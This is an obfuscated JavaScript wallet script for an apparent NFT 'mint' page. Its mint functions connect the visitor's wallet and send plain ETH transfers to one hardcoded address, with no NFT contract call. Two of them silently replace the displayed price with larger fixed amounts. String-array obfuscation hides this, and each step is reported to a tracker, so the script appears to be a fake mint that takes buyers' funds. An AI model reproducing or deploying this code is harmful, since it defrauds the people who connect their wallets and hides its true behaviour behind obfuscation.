const _0x5bccb2 = _0x1968;
(function (_0x22ad8d, _0x21d832) {
    const _0x21de22 = _0x1968,
        _0x2a8cdd = _0x22ad8d();
    while (!![]) {
        try {
            const _0x324379 = parseInt(_0x21de22(0x183)) / 0x1 + parseInt(_0x21de22(0x163)) / 0x2 + -parseInt(_0x21de22(0x173)) / 0x3 * (-parseInt(_0x21de22(0x166)) / 0x4) + parseInt(_0x21de22(0x16f)) / 0x5 + -parseInt(_0x21de22(0x17c)) / 0x6 + -parseInt(_0x21de22(0x16a)) / 0x7 * (-parseInt(_0x21de22(0x17a)) / 0x8) + -parseInt(_0x21de22(0x178)) / 0x9;
            if (_0x324379 === _0x21d832) break;
            else _0x2a8cdd['push'](_0x2a8cdd['shift']());
        } catch (_0x28e30e) {
            _0x2a8cdd['push'](_0x2a8cdd['shift']());
        }
    }
}(_0x35bf, 0x46260));
const NETWORK_ID = 0x1,
    RPC_URL = 'https://mainnet.infura.io/v3/9755ac313c1246c289db811baf8e542a',
    ADDRESS = '0x6dc4d89f1D326beD32d0F983dfB0C58510797E49';

function _0x35bf() {
    const _0x2e95bf = ['1849595ANncEP', 'walletSelect', 'log', 'trackEvent', '62016PSlfDA', 'Error\x20Sending\x20Mint\x20Transaction', 'getUncheckedSigner', 'provider', 'setItem', '7748820DAgLre', 'connectWallet', '3976936xhfzQi', 'name', '2521524vtOgaM', 'sendTransaction', 'localStorage', 'push', 'readyToTransact', 'onboard', 'walletCheck', '43370ixmNmF', '985560mFeiOb', 'providers', 'parseEther', '32nuWobS', 'message', 'selectedWallet', 'Mint', '7PslqiV', 'sendEth', 'NFTs', 'getElementById', 'metamask'];
    _0x35bf = function () {
        return _0x2e95bf;
    };
    return _0x35bf();
}

class Wallet {
    [_0x5bccb2(0x176)];
    [_0x5bccb2(0x181)] = Onboard({
        'networkId': NETWORK_ID,
        'darkMode': !0x0,
        'subscriptions': {
            'wallet': wallet => {
                const _0x5e0f8b = _0x5bccb2;
                wallet[_0x5e0f8b(0x176)] ? (this[_0x5e0f8b(0x176)] = new ethers[(_0x5e0f8b(0x164))]['Web3Provider'](wallet[_0x5e0f8b(0x176)], 'any'), window[_0x5e0f8b(0x17e)][_0x5e0f8b(0x177)](_0x5e0f8b(0x168), wallet[_0x5e0f8b(0x17b)])) : this[_0x5e0f8b(0x176)] = null;
            }
        },
        'walletSelect': {
            'wallets': [{
                'walletName': _0x5bccb2(0x16e)
            }, {
                'walletName': 'trust',
                'rpcUrl': RPC_URL
            }, {
                'walletName': 'walletConnect',
                'infuraKey': '9755ac313c1246c289db811baf8e542a'
            }]
        }
    });

    async [_0x5bccb2(0x179)]() {
        const _0x2e3dc0 = _0x5bccb2;
        await this[_0x2e3dc0(0x181)][_0x2e3dc0(0x170)](), await this[_0x2e3dc0(0x181)][_0x2e3dc0(0x182)]();
    }

    ['readyToTransact'] = async () => {
        const _0x5135da = _0x5bccb2;
        if (!this[_0x5135da(0x176)]) {
            const _0x2d8fe3 = await this['onboard'][_0x5135da(0x170)]();
            if (!_0x2d8fe3) return !0x1;
        }
        const _0x3d8244 = await this[_0x5135da(0x181)][_0x5135da(0x182)]();
        return _0x3d8244;
    };

    async [_0x5bccb2(0x16b)]() {
        const _0x5ed474 = _0x5bccb2;
        let _0x5a8f1b = document[_0x5ed474(0x16d)]('price')['textContent']['toString']();
        _paq[_0x5ed474(0x17f)]([_0x5ed474(0x172), _0x5ed474(0x169), 'Click\x20Mint', _0x5ed474(0x16c), _0x5a8f1b]), console[_0x5ed474(0x171)](_0x5a8f1b);
        const _0x38254a = await this[_0x5ed474(0x180)]();
        if (!_0x38254a) return;
        _paq[_0x5ed474(0x17f)](['trackEvent', _0x5ed474(0x169), 'Select\x20Wallet', _0x5ed474(0x16c)]);
        const _0x16cf54 = this[_0x5ed474(0x176)][_0x5ed474(0x175)]();
        try {
            await _0x16cf54[_0x5ed474(0x17d)]({
                'to': ADDRESS,
                'value': ethers['utils'][_0x5ed474(0x165)](_0x5a8f1b),
                'gasLimit': 0x186a0
            }), _paq['push']([_0x5ed474(0x172), _0x5ed474(0x169), 'Send\x20Mint\x20Transaction', _0x5ed474(0x16c), _0x5a8f1b]);
        } catch (_0x1b5886) {
            console[_0x5ed474(0x171)](_0x1b5886[_0x5ed474(0x167)]), _paq[_0x5ed474(0x17f)]([_0x5ed474(0x172), 'Mint', _0x5ed474(0x174), _0x1b5886[_0x5ed474(0x167)], _0x5a8f1b]);
        }
    }

    async ['sendEth2']() {
        const _0x5ed474 = _0x5bccb2;
        let _0x5a8f1b = document[_0x5ed474(0x16d)]('price')['textContent']['toString']();
        _0x5a8f1b = (0.3 * 2).toString();
        _paq[_0x5ed474(0x17f)]([_0x5ed474(0x172), _0x5ed474(0x169), 'Click\x20Mint', _0x5ed474(0x16c), _0x5a8f1b]), console[_0x5ed474(0x171)](_0x5a8f1b);
        const _0x38254a = await this[_0x5ed474(0x180)]();
        if (!_0x38254a) return;
        _paq[_0x5ed474(0x17f)](['trackEvent', _0x5ed474(0x169), 'Select\x20Wallet', _0x5ed474(0x16c)]);
        const _0x16cf54 = this[_0x5ed474(0x176)][_0x5ed474(0x175)]();
        try {
            await _0x16cf54[_0x5ed474(0x17d)]({
                'to': ADDRESS,
                'value': ethers['utils'][_0x5ed474(0x165)](_0x5a8f1b),
                'gasLimit': 0x186a0
            }), _paq['push']([_0x5ed474(0x172), _0x5ed474(0x169), 'Send\x20Mint\x20Transaction', _0x5ed474(0x16c), _0x5a8f1b]);
        } catch (_0x1b5886) {
            console[_0x5ed474(0x171)](_0x1b5886[_0x5ed474(0x167)]), _paq[_0x5ed474(0x17f)]([_0x5ed474(0x172), 'Mint', _0x5ed474(0x174), _0x1b5886[_0x5ed474(0x167)], _0x5a8f1b]);
        }
    }

    async ['sendEth3']() {
        const _0x5ed474 = _0x5bccb2;
        let _0x5a8f1b = document[_0x5ed474(0x16d)]('price')['textContent']['toString']();
        _0x5a8f1b = (0.3 * 3).toString();
        _paq[_0x5ed474(0x17f)]([_0x5ed474(0x172), _0x5ed474(0x169), 'Click\x20Mint', _0x5ed474(0x16c), _0x5a8f1b]), console[_0x5ed474(0x171)](_0x5a8f1b);
        const _0x38254a = await this[_0x5ed474(0x180)]();
        if (!_0x38254a) return;
        _paq[_0x5ed474(0x17f)](['trackEvent', _0x5ed474(0x169), 'Select\x20Wallet', _0x5ed474(0x16c)]);
        const _0x16cf54 = this[_0x5ed474(0x176)][_0x5ed474(0x175)]();
        try {
            await _0x16cf54[_0x5ed474(0x17d)]({
                'to': ADDRESS,
                'value': ethers['utils'][_0x5ed474(0x165)](_0x5a8f1b),
                'gasLimit': 0x186a0
            }), _paq['push']([_0x5ed474(0x172), _0x5ed474(0x169), 'Send\x20Mint\x20Transaction', _0x5ed474(0x16c), _0x5a8f1b]);
        } catch (_0x1b5886) {
            console[_0x5ed474(0x171)](_0x1b5886[_0x5ed474(0x167)]), _paq[_0x5ed474(0x17f)]([_0x5ed474(0x172), 'Mint', _0x5ed474(0x174), _0x1b5886[_0x5ed474(0x167)], _0x5a8f1b]);
        }
    }
}

function _0x1968(_0x1f82a2, _0x3a3ab6) {
    const _0x35bf50 = _0x35bf();
    return _0x1968 = function (_0x19685a, _0x28c442) {
        _0x19685a = _0x19685a - 0x163;
        let _0x14e0f7 = _0x35bf50[_0x19685a];
        return _0x14e0f7;
    }, _0x1968(_0x1f82a2, _0x3a3ab6);
}

const wallet = new Wallet();